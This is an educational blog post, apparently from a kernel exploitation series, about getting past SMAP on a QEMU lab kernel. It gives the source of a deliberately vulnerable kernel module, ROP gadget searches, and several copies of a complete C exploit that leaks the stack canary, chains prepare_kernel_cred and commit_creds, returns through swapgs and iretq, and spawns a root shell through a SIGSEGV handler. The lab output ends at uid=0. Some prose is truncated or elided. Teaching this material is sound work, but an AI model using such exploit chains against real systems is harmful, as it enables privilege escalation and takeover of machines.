+++
tags = ["linux","kernel"]
categories = ["Linux Kernel Exploitation"]
date = "2022-01-27"
description = "Bypassing supervisor mode access prevention (SMAP), a kernel exploit mitigation feature. Part four of a series of posts on Linux kernel exploitation techniques."
featuredpath = "date"
linktitle = ""
title = "Linux Kernel 0x03 :: Bypass SMAP with SIGSEGV Handler"
slug = "linux-kernel-3-bypass-smep"
type = "post"
+++

## Table of Contents
 1. [Overview of Supervisor Mode Access Prevention](#overview-of-supervisor-mode-access-prevention)
 2. [SMAP Bypass Techniques](#smap-bypass-techniques)
 3. [A Vulnerable Kernel Module](#a-vulnerable-kernel-module)
 4. [Building a Complete Escalation Chain](#building-a-complete-escalation-chain)
 5. [Environment Setup](#environment-setup)
 6. [Building the Exploit](#building-the-exploit) 
 7. [Fixing the Exploit with a SIGSEGV Handler](#fixing-the-exploit-with-a-sigsegv-handler)


## Overview of Supervisor Mode Access Prevention
Supervisor mode access prevention (SMAP) is a kernel exploit mitigation feature that marks all user-space pages as non-accessible when the process is in kernel-space (slightly different to SMEP, as SMEP marks user-space pages as non-executable). This means that read/write access to user-space pages is disabled.

When used in combination with SMEP, it will remove read / write / execution permissions from all user-space pages. This can be a powerful way to mitigate kernel exploitation.

As we cannot read or write user-space memory, we'll have to find a different way to control process execution. We can (once again) do this via return-oriented programming (ROP).


## SMAP Bypass Techniques
Unlike SMEP, there isn't a straight-forward way to simply bypass SMAP. Instead, we'll have to craft a full exploit chain that replicates the return to user-space process. This way we'll be able to return to user-space and execute arbitrary code with elevated privileges.

Here are the steps we need to take in order to return to user-space via ROP chain:
 - Execute a `swapgs` instruction to swap the ensure the GS register corresponds to user-space.
 - Execute an `iret` instruction to restore our user-space registers.
 - Ensure that our `iret` frame is positioned correctly at the top of the stack.


## A Vulnerable Kernel Module
We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module ha.

For an overview of the vulnerabilities present in this kernel module, please read the post detailing the `ret2usr` technique.

{{< code language="c" title="challenge.c" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

char out[256];

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_to_user(buf, tmp, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_from_user(tmp, buf, len);
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

struct proc_dir_entry *proc_entry;

int init_module(void)
{
    proc_entry = proc_create("challenge", 0666, NULL, &fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
{{< /code >}}


## Building a Complete Escalation Chain
We'll need several different gadgets to build our complete escalation chain. Let's look for a `pop rdi` gadget for function calls, these are quite easy to find.

```
~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 1 --unique | grep 'pop rdi ; ret'
0xffffffff81001518: pop rdi ; ret  ;  (7337 found)
...
```

We'll also need a `swapgs` instruction in order to return to user-space, this was also found quite easily.

```
~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 2 --unique | grep 'swapgs'
0xffffffff81c00eaa: swapgs  ; popfq  ; ret  ;  (1 found)
```

One of the trickier gadgets to find was a gadget that allowed us to move the value of `rax` (a return value) into `rdi` for a subsequent function call. I settled on a `add rdi, rax` gadget.

```
~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 3 --unique | grep 'add rdi, rax'
0xffffffff8158f72a: add rdi, rax ; cmp rdi, 0x01 ; setbe al ; ret  ;  (1 found)
```

Lastly, we need an `iret` instruction to return to user-space. This was a little annoying to find as `rp++` didn't seem to like finding `iret` instructions, so here's an `objdump` command that does the same thing.

```
~/pwnkernel $ objdump -j .text -d linux-5.4/vmlinux | grep 'iret'
ffffffff8101a9e3:   e8 d8 4d 00 00          callq  ffffffff8101f7c0 <show_iret_regs>
ffffffff8101c490 <fixup_bad_iret>:
ffffffff8101c4d3:   74 04                   je     ffffffff8101c4d9 <fixup_bad_iret+0x49>
ffffffff8101f7c0 <show_iret_regs>:
ffffffff8101f856:   e9 65 ff ff ff          jmpq   ffffffff8101f7c0 <show_iret_regs>
ffffffff81023cc2:   48 cf                   iretq
...
```

Putting all these together we can construct a complete escalation chain that mimics the process that the kernel uses to return back to user-space, allowing us to bypass SMAP with a ROP chain.

Note the `iret` frame at the end of the chain, this will sit at the top of our stack when the `iret` instruction is executed.

```c
void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[20];

    payload[4] = canary;
    
    payload[5] = 0xffffffff81001518; // pop rdi; ret
    payload[6] = 0x00;               // rdi = 0x00
    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred

    payload[8]  = 0xffffffff81001518; // pop rdi; ret
    payload[9]  = 0x00;               // rdi = 0x00
    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
    payload[11] = 0xffffffff81087e80; // commit_creds

    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
    payload[13] = 0x00;               // rbp = 0x00

    payload[14] = 0xffffffff81023cc2; // iretq 
    payload[15] = (unsigned long)shell;
    payload[16] = save_cs;
    payload[17] = save_rf;
    payload[18] = save_sp;
    payload[19] = save_ss;

    write(fd, payload, sizeof(unsigned long) * 20);
}
```


## Environment Setup
Taking our `launch.sh` script from the previous Linux kernel exploitation post (bypassing smep), all we need to add is the additional `+smap` flag to the `-cpu kvm64,+smep` line. 

Note that we'll also be using linux kernel version 5.4, so make sure to update that if using a different kernel version.

{{< code language="sh" title="launch.sh" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-5.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr nopti quiet"
{{< /code >}}


## Building the Exploit
...

{{< code language="c" title="exploit.c" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[5];
    read(fd, leak, sizeof(unsigned long) * 5);
    return leak[4];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[20];

    payload[4] = canary;
    
    payload[5] = 0xffffffff81001518; // pop rdi; ret
    payload[6] = 0x00;               // rdi = 0x00
    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred

    payload[8]  = 0xffffffff81001518; // pop rdi; ret
    payload[9]  = 0x00;               // rdi = 0x00
    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
    payload[11] = 0xffffffff81087e80; // commit_creds

    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
    payload[13] = 0x00;               // rbp = 0x00

    payload[14] = 0xffffffff81023cc2; // iretq 
    payload[15] = (unsigned long)shell;
    payload[16] = save_cs;
    payload[17] = save_rf;
    payload[18] = save_sp;
    payload[19] = save_ss;

    write(fd, payload, sizeof(unsigned long) * 20);
}

int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
{{< /code >}}

...

```
```


## Fixing the Exploit with a SIGSEGV Handler
...

```c
void signal_handler(int signum)
{
    system("/bin/sh");
}
```

...

```c
int main(int argc, char **argv)
{
    save_user_space();

    /* register signal handler */
    signal(SIGSEGV, signal_handler);

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
```

...

```c
void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[20];

    payload[4] = canary;
    
    payload[5] = 0xffffffff81001518; // pop rdi; ret
    payload[6] = 0x00;               // rdi = 0x00
    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred

    payload[8]  = 0xffffffff81001518; // pop rdi; ret
    payload[9]  = 0x00;               // rdi = 0x00
    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
    payload[11] = 0xffffffff81087e80; // commit_creds

    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
    payload[13] = 0x00;               // rbp = 0x00

    payload[14] = 0xffffffff81023cc2; // iretq 
    payload[15] = 0xdeadbeef;         // rip = 0xdeadbeef (segfault)
    payload[16] = save_cs;
    payload[17] = save_rf;
    payload[18] = save_sp;
    payload[19] = save_ss;

    write(fd, payload, sizeof(unsigned long) * 20);
}
```

...

{{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void signal_handler(int signum)
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[5];
    read(fd, leak, sizeof(unsigned long) * 5);
    return leak[4];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[20];

    payload[4] = canary;
    
    payload[5] = 0xffffffff81001518; // pop rdi; ret
    payload[6] = 0x00;               // rdi = 0x00
    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred

    payload[8]  = 0xffffffff81001518; // pop rdi; ret
    payload[9]  = 0x00;               // rdi = 0x00
    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
    payload[11] = 0xffffffff81087e80; // commit_creds

    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
    payload[13] = 0x00;               // rbp = 0x00

    payload[14] = 0xffffffff81023cc2; // iretq 
    payload[15] = 0xdeadbeef;         // rip = 0xdeadbeef (segfault)
    payload[16] = save_cs;
    payload[17] = save_rf;
    payload[18] = save_sp;
    payload[19] = save_ss;

    write(fd, payload, sizeof(unsigned long) * 20);
}

int main(int argc, char **argv)
{
    save_user_space();

    /* register signal handler */
    signal(SIGSEGV, signal_handler);

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
{{< /code >}}

...

```
/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
uid=0(root) gid=0
```


## Appendix
 - [Learning Linux Kernel Exploitation - Part 2](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)
 - [KSMASH - Kernel Stack Smashing](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)
